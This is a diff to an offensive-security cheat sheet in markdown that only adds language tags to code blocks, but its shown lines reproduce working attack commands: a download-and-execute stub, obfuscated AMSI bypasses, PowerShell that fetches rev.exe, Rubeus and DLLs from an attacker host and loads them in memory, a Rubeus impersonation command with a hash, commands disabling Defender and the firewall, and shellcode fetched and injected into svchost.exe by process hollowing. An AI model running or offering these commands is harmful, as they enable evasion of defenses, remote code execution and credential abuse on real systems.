@@ -271,7 +271,7 @@ IntPtr.Zero, 0, IntPtr.Zero);
 
 ## Download&Execute
 
-```
+```javascript
 var url = "http://YOUR_SERVER/YOUR.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
@@ -426,7 +426,7 @@ Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
 
 ## Disable Restricted Admin:
 
-```
+```powershell
 Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
 DisableRestrictedAdmin
 ```
@@ -443,13 +443,13 @@ DisableRestrictedAdmin
 <br>
 
 ### Method 2:
-```
+```powershell
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
 ```
 <br>
 
 ### Method 3:
-```
+```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
 
 ```
@@ -459,7 +459,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ## Load C# assembly reflectively:
 
 ## Download and run assembly without arguments
-```
+```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [rev.Program]::Main()
@@ -467,7 +467,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 <br>
 
 ## Download and run Rubeus, with arguments (make sure to split the args)
-```
+```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
@@ -475,7 +475,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 <br>
 
 ## Execute a specific method from an assembly (e.g. a DLL)
-```
+```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
@@ -519,7 +519,7 @@ C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all
 <br>
 
 ### Disable Defender / Firewall
-```
+```powershell
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
 NetSh Advfirewall set allprofiles state off
 ```
@@ -562,7 +562,7 @@ NetSh Advfirewall set allprofiles state off
 
 ### Load DLL Remote:
 
-```
+```powershell
 $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
 Import-Module -Assembly $a
 ```
@@ -571,7 +571,7 @@ Import-Module -Assembly $a
 
 ### Load DLL local:
 
-```
+```powershell
 $a=[System.Reflection.Assembly]::Load($(C:\Path\To\DLL); import-module -assembly $a
 ```
 
@@ -579,7 +579,7 @@ $a=[System.Reflection.Assembly]::Load($(C:\Path\To\DLL); import-module -assembly
 
 ### Remote load&encrypt&processhollow:
 
-```
+```powershell
 $code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
 INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
 ```
@@ -588,11 +588,11 @@ INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVect
 
 ### Impersonating process token&processhollow:
 
-```
+```powershell
 $code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
 ```
 
-```
+```powershell
 Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
 ```
  
